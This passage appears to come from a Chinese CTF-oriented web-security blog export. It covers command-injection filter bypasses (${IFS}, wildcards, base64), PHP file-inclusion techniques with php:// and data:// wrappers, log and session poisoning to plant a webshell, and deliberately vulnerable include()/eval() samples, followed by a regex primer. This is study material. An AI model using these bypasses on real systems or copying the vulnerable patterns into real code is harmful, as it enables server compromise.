<li><code>|</code>前面的语句为假，则直接报错，后面的语句也不执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720195652502.png" class="" loading="lazy">

<ul>
<li><code>|</code>前面的语句为真，则直接执行后面的语句</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720195738526.png" class="" loading="lazy">

<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
</table>
<ul>
<li><code>||</code>前面的语句为假，就执行后面的语句</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720200122936.png" class="" loading="lazy">

<ul>
<li><code>||</code>前面的语句为真，则只执行前面的语句，后面的语句不执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720200213799.png" class="" loading="lazy">

<h1 id="Linux下的命令连接符"><a href="#Linux下的命令连接符" class="headerlink" title="Linux下的命令连接符"></a>Linux下的命令连接符</h1><p>Linux下的命令连接符包括<code>;</code>、<code>&amp;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>。</p>
<h2 id="；"><a href="#；" class="headerlink" title="；"></a>；</h2><ul>
<li><code>;</code>可以连接多条命令，前后的命令都会执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720200618616.png" class="" loading="lazy">

<h2 id="amp-1"><a href="#amp-1" class="headerlink" title="&amp;"></a>&amp;</h2><ul>
<li><code>&amp;</code>使命令在后台运行，这样就可以同时执行多条命令</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720210028843.png" class="" loading="lazy">

<h2 id="amp-amp-1"><a href="#amp-amp-1" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h2><ul>
<li>如果前面的命令不能成功执行，后面的命令也不执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720210516034.png" class="" loading="lazy">

<ul>
<li>如果前面的命令执行成功，那么前后的命令都执行</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720210548637.png" class="" loading="lazy">

<h2 id="-1"><a href="#-1" class="headerlink" title="|"></a>|</h2><ul>
<li>将前面的命令输出作为后面的命令输出，前面的命令和后面的命令都执行，但是只会显示后面的命令</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720210746005.png" class="" loading="lazy">

<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
</table>
<ul>
<li>类似于程序中的if-else语句，若前面的命令执行成功，则后面的命令就不会执行；若前面的命令执行不成功，则执行后面的命令</li>
</ul>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210720213939890.png" class="" loading="lazy">

<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><ul>
<li>${IFS}</li>
</ul>
<p><code>$IFS</code>是shell的特殊环境变量，是Linux下的内部域分隔符。</p>
<p><code>$IFS</code>的值可以是空格、制表符、换行符或者其他自定义符号。</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721133735233.png" class="" loading="lazy">

<ul>
<li>$IFS$9</li>
</ul>
<p>空格过滤可以用<code>$IFS$9</code>绕过</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721133844454.png" class="" loading="lazy">

<ul>
<li>制表符</li>
</ul>
<p><code>%09</code>是制表符的URL编码，可以用来代替空格，绕过空格过滤</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721133936141.png" class="" loading="lazy">

<ul>
<li>{}</li>
</ul>
<p>空格过滤可以用<code>&#123;&#125;</code>绕过</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721134628783.png" class="" loading="lazy">

<ul>
<li>&lt;</li>
</ul>
<p>空格过滤可以用<code>&lt;</code>绕过</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721141612371.png" class="" loading="lazy">

<h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><ul>
<li>变量拼接</li>
</ul>
<p>Linux支持变量赋值，在Linux环境下可以通过变量拼接来绕过过滤规则</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721143412855.png" class="" loading="lazy">

<ul>
<li>空变量</li>
</ul>
<p>可以在变量中插入<code>空变量</code>来绕过命令过滤</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721143630639.png" class="" loading="lazy">

<ul>
<li>系统变量</li>
</ul>
<p><code>$&#123;SHELLOPTS&#125;</code>是系统变量，通常是内置变量，用法也很简单，${SHELLOPTS:<code>start</code>:<code>length</code>}</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721144323820.png" class="" loading="lazy">

<p>可以利用系统变量的字符拼接绕过过滤</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721150028201.png" class="" loading="lazy">

<ul>
<li>\</li>
</ul>
<p><code>c\a\t</code>=<code>cat</code></p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721150203488.png" class="" loading="lazy">

<ul>
<li>通配符</li>
</ul>
<p>Linux支持利用通配符进行字符匹配，利用通配符可以匹配文件中某些不确定的字符</p>
<p><code>*</code>：代表任意个字符</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721150434859.png" class="" loading="lazy">

<p><code>?</code>：代表一个字符</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721150711929.png" class="" loading="lazy">

<p><code>[]</code>：匹配<code>[]</code>中任意一个字符</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721150759650.png" class="" loading="lazy">

<ul>
<li>Base64</li>
</ul>
<p><a href="https://www.jianshu.com/p/ce273012073e">在Linux下可以使用base64命令进行加密和解密</a>，输出解码后的字符再执行就可以绕过关键字了</p>
<img src="/2021/07/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210721152434665.png" class="" loading="lazy">

<ul>
<li>expr和awk</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web漏洞</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含-PHP</title>
    <url>/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><blockquote>
<p>和sql注入攻击方式类似，文件包含本质上就是输入一段用户能够控制的脚本或者代码，并让服务器执行。</p>
</blockquote>
<blockquote>
<p>许多脚本支持使用包含文件（include file），这种功能允许开发者把可使用的代码或脚本插入到单个文件中，然后包含文件中的代码被解释并执行，就好像直接插入到包含指令的位置一样。</p>
</blockquote>
<p>以PHP为例，常用的文件包含函数有以下四种：<code>include()</code>，<code>require()</code>，<code>include_once()</code>，<code>require_once()</code></p>
<p>区别如下：</p>
<blockquote>
<p>require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。<br>include()，找不到被包含的文件时只会产生警告，脚本将继续运行。<br>include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
</blockquote>
<p><a href="https://blog.csdn.net/Monsterlz123/article/details/93964916">参考链接</a></p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
<li>include.php</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span></span></code></pre>

<ul>
<li>payload：url&#x2F;?file&#x3D;flag</li>
</ul>
<p>可以嵌套包含文件，例：<strong>url&#x2F;?file&#x3D;flag&#x2F;..&#x2F;flag</strong>（此payload等价于上面的payload）</p>
<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210714165446989.png" class="" loading="lazy">

<ul>
<li>%00截断</li>
</ul>
<p>条件</p>
<blockquote>
<p><code>magic_quotes_gpc</code> &#x3D; Off</p>
<p>php &lt; 5.3.4</p>
</blockquote>
<ul>
<li>路径长度截断</li>
</ul>
<p>条件</p>
<blockquote>
<p>php &lt; 5.2.8</p>
</blockquote>
<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><ul>
<li>原理：事实上是支持的协议与封装协议</li>
</ul>
<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><ul>
<li><p>作用：访问各个输入&#x2F;输出流</p>
</li>
<li><p>条件：</p>
</li>
</ul>
<blockquote>
<p>allow_url_fopen:On&#x2F;Off</p>
<p>allow_url_include:仅<code>php://input,php://stdin,php://memory,php://temp</code>需要on</p>
</blockquote>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><ul>
<li>条件：</li>
</ul>
<blockquote>
<p>allow_url_fopen: On&#x2F;Off</p>
<p>allow_url_include: On</p>
<p>PHP &lt; 5.3.0</p>
</blockquote>
<ul>
<li><p>用法：用于执行php代码</p>
<p>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code>的时候<code>php://input</code> 是无效的。</p>
</li>
<li><p>演示：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">#test.php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></li>
</ul>
<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210711190303421.png" class="" loading="lazy">

<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><ul>
<li><p>条件：</p>
<blockquote>
<p>allow_url_fopen: Off&#x2F;On</p>
<p>allow_url_include: Off&#x2F;On</p>
</blockquote>
</li>
<li><p>用法：主要用于读取文件源码或者写入源码</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">描述</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">resource&#x3D;&lt;要过滤的数据流&gt;</td>
<td align="center">指定了你要筛选过滤的数据流</td>
<td align="center">必选</td>
</tr>
<tr>
<td align="center">read&#x3D;&lt;读链的筛选列表&gt;</td>
<td align="center">可以设定一个或多个过滤器名称，以管道符（</td>
<td align="center">）分隔</td>
</tr>
<tr>
<td align="center">&lt;；两个链的筛选列表&gt;</td>
<td align="center">任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链</td>
<td align="center">可选</td>
</tr>
</tbody></table>
<p>read参数可为</p>
<blockquote>
<p>string.strip_tags： 将数据流中的所有html标签清除</p>
<p>string.rot13：将数据流中的内容rot13变换</p>
<p>string.toupper： 将数据流中的内容转换为大写</p>
<p>string.tolower： 将数据流中的内容转换为小写</p>
<p>convert.base64-encode： 将数据流中的内容转换为base64编码</p>
<p>convert.base64-decode： 将数据流中的内容转换为base64解码</p>
</blockquote>
</li>
<li><p>演示：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">#test.php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210711193555551.png" class="" loading="lazy"></li>
</ul>
<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><ul>
<li><p>条件：</p>
<blockquote>
<p>allow_url_fopen: On</p>
<p>allow_url_include: On</p>
<p>PHP &gt;&#x3D; 5.2.0</p>
</blockquote>
</li>
<li><p>用法：数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
<blockquote>
<p>data:&#x2F;&#x2F;text&#x2F;plain;base64,<code>your source</code> （或者 data:text&#x2F;plain;base64,<code>your source</code>）</p>
<p>data:&#x2F;&#x2F;text&#x2F;plain,<code>your source</code> or data:text&#x2F;plain,<code>your source</code></p>
</blockquote>
</li>
<li><p>演示：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">#test.php</span>
    <span class="token comment">#&lt;?php phpinfo(); ===base64===>  PD9waHAgcGhwaW5mbygpOw==</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210711194758666.png" class="" loading="lazy"></li>
</ul>
<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><ul>
<li><p>条件：</p>
<blockquote>
<p>allow_url_fopen: Off&#x2F;On</p>
<p>allow_url_include: Off&#x2F;On</p>
</blockquote>
</li>
<li><p>用法：用于访问本地文件系统</p>
<blockquote>
<p>file:&#x2F;&#x2F;<code>文件的绝对路径和文件名</code><br>a&#x3D;file:&#x2F;&#x2F;D:phpstudy_pro&#x2F;www&#x2F;phpinfo.php</p>
<p>文件的相对路径和文件名 a&#x3D;.&#x2F;test.php</p>
<p>http:&#x2F;&#x2F;网络路径和文件名<br>a&#x3D;<a href="http://127.0.0.1/phpinfo.php">http://127.0.0.1/phpinfo.php</a></p>
</blockquote>
</li>
<li><p>演示：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">#test.php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210711195539934.png" class="" loading="lazy"></li>
</ul>
<h1 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h1><ul>
<li>原理：对网站进行访问时，日志文件会记录相关的信息（UA头中的信息）</li>
<li>要求：知道日志文件的路径并且能够包含</li>
<li>步骤：<ol>
<li>访问网站，在UA头里写马</li>
<li>通过post检查代码是否执行</li>
<li>成功后蚁剑连接反弹shell</li>
</ol>
</li>
</ul>
<h1 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h1><ul>
<li><p>Session：</p>
<blockquote>
<p>Session就是保存在服务器的文本文件。 默认情况下，PHP.ini 中设置的SESSION 保存方式是 files（session.save_handler &#x3D; files），即使用读写文件的方式保存 SESSION 数据，而 SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_为前缀，后跟 SESSION ID，文件中的数据即是序列化之后的 SESSION 数据</p>
</blockquote>
</li>
<li><p>原理：由于Session保存的文件名没有经过严格的过滤或者限制，从而可以被用户控制，执行任意代码</p>
</li>
<li><p>要求：</p>
<blockquote>
<p>PHP &gt;&#x3D; 5.4.0</p>
<p>必须先启动，在PHP中先调用<code>session_start(void)</code>，注意，此函数前不能有任何输出</p>
<p>如果在PHP.ini中<strong>session.auto_start</strong>已经开启则不用，但默认情况下是关闭的</p>
</blockquote>
</li>
<li><p>配置</p>
<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210712144709737.png" class="" loading="lazy">

<ul>
<li><strong>session.auto_start</strong>：在php接收请求的时候自动初始化Session，不需要再执行<code>session_start()</code>，默认情况下关闭</li>
<li><strong>session.save_path</strong>：Session存储的位置，我这里就是<code>D:\phpstudy_pro\Extensions\tmp\tmp</code></li>
<li><strong>session.serialize_handler</strong><ul>
<li><strong>php</strong>：一直都在(默认方式) 它是用 |分割</li>
<li><strong>php_serialize</strong> ：php5.5之后启用<br>它是用serialize反序列化格式分割</li>
</ul>
</li>
<li><strong>session.upload_progress</strong>：php5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化Session，PHP也会自动初始化Session。<br>而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启<ul>
<li><strong>session.upload_progress.enabled</strong>：默认开启，表示<code>upload_progress</code>功能开始，php能在每一个文件上传时监测上传进度，这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</li>
<li><strong>session.upload_progress.cleanup</strong>：默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。</li>
<li><strong>session.upload_progress.prefix</strong>与<strong>session.upload_progress.name</strong>：当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>变量同名（<code>PHP_SESSION_UPLOAD_PROGRESS</code>）时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）,<br>索引是<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值</li>
<li><strong>session.upload_progress.freq<br><strong>与</strong>session.upload_progress.min_freq</strong>：选项控制了上传进度信息应该多久被重新计算一次。<br>通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计</li>
</ul>
</li>
<li><strong>session.use_strict_mode</strong>：默认为0，用户可以自己定义<code>Session ID</code>。比如，我们在Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>sess_flag</code></li>
</ul>
</li>
<li><p>演示</p>
<pre class="language-php" data-language="php"><code class="language-php">#test.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
<pre class="language-php" data-language="php"><code class="language-php">#session.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span></span></code></pre>

<p>恶意写session文件马</p>
<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210712151227785.png" class="" loading="lazy">

<p>包含session文件，成功执行命令</p>
<img src="/2021/07/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20210712151618684.png" class="" loading="lazy"></li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web漏洞</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><em>正则表达式</em>(regular expression)描述了一种字符串匹配的模式（pattern），常见于匹配子串。</p>
<p>基本语法为：</p>
<pre class="language-none"><code class="language-none">&#x2F;pattern&#x2F;flags</code></pre>

<p>这在各种语言中都有出现，比如PHP中的正则函数<code>grep_match</code>就是用来匹配字符串。</p>
<p>当然不仅仅局限于编程语言当中，他可以出现在任何需要匹配字符子串的场景中，比如处理文档时检索某个内容：</p>
<ul>
<li><p>检索当前文件中的变量</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220805222331828.png" class="" loading="lazy"></li>
</ul>
<p>巧妙的使用正则匹配可以大幅提升工作效率。</p>
<h1 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h1><ol>
<li><p>直接在<code>/</code>中输入想要匹配的内容，最基本的用法，只能匹配到一模一样的字符串，跟搜索没有区别。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220805222829510.png" class="" loading="lazy">
</li>
<li><p><code>[abc]</code>：括号意为可选项，即匹配<code>[...]</code>中所有字符的其中一个。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220805200436292.png" class="" loading="lazy">
</li>
<li><p><code>[a-z]</code>：表示一个区间，匹配区间内的所有字符，包括边界。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220805200520343.png" class="" loading="lazy"></li>
</ol>
<h1 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h1><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p>
<ol>
<li><p><code>i</code>：ignore - 不区分大小写。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220806012733414.png" class="" loading="lazy">
</li>
<li><p><code>g</code>：global - 全局匹配。查找所有的匹配项。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220806012805337.png" class="" title="image-20220806012805337" loading="lazy">
</li>
<li><p><code>m</code>：multi line - 多行匹配。使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220806013312632.png" class="" loading="lazy">
</li>
<li><p><code>s</code>：特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong>。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220806013422770.png" class="" loading="lazy"></li>
</ol>
<h1 id="特殊的字符集"><a href="#特殊的字符集" class="headerlink" title="特殊的字符集"></a>特殊的字符集</h1><p>有些字符可以代表一些常用的字符集。通常大写与小写的集合是完全相对立的。</p>
<ol>
<li><p><code>\w</code>&#x2F;<code>\W</code>：小写<code>w</code>匹配字母、数字、下划线，等价于 <code>[A-Za-z0-9_]</code>。大写则相反。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220805224603872.png" class="" loading="lazy">
</li>
<li><p><code>\s</code>&#x2F;<code>\S</code>：匹配任何空白字符，包括空格、制表符、换页符等等。等价于 <code>[ \f\n\r\t\v]</code>。大写则相反。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220805230219729.png" class="" loading="lazy">
</li>
<li><p><code>\d</code>&#x2F;<code>\D</code>：匹配一个数字字符。等价于 [0-9]。大写则相反。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220805230310445.png" class="" loading="lazy">
</li>
<li><p><code>\b</code>&#x2F;<code>\B</code>：匹配一个单词边界，也就是指单词和空格间的位置。例如，<code>er\b</code>可以匹配<strong>never</strong>中的<strong>er</strong>，但不能匹配<strong>verb</strong>中的 <strong>er</strong>。大写则相反。</p>
<img src="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220806010503317.png" class="" loading="lazy"></li>
</ol>
<h1 id="特殊的符号"><a href="#特殊的符号" class="headerlink" title="特殊的符号"></a>特殊的符号</h1><p>符号在正则中也有一些特殊的含义。</p>
<ol>
<li><code>\</code>：转义符。</li>
<li><code>^</code>：匹配输入字符串的开始位置。在<code>[]</code>中则为取反。</li>
<li><code>$</code>：匹配输入字符串的结束位置。</li>
<li><code>*</code>：匹配前面的子表达式0或n次。</li>
<li><code>+</code>：匹配前面的子表达式1或n次。</li>
<li><code>?</code>：匹配前面的子表达式0或1次。</li>
<li><code>&#123;n&#125;</code>：n 是一个非负整数。匹配确定的 n 次。例如：<code>a&#123;2&#125;</code>&#x3D;匹配2个a、<code>a&#123;2,&#125;</code>&#x3D;匹配2个以上的a、<code>a&#123;2,4&#125;</code>&#x3D;匹配2-4个a。</li>
<li><code>.</code>：匹配除换行符（\n、\r）之外的任何单个字符。</li>
<li><code>x|y</code>：匹配 x 或 y。</li>
<li><code>\f</code>：匹配一个换页符。</li>
<li><code>\n</code>：匹配一个换行符。</li>
<li><code>\r</code>：匹配一个回车符。</li>
<li><code>\t</code>：匹配一个制表符。</li>
<li><code>\v</code>：匹配一个垂直制表符。</li>
</ol>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>一些特殊的RCE绕过</title>
    <url>/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/</url>
    <content><![CDATA[<h1 id="无字母数字"><a href="#无字母数字" class="headerlink" title="无字母数字"></a>无字母数字</h1><p>当字母和数字都被过滤时怎样RCE呢？核心代码如下。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  	<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
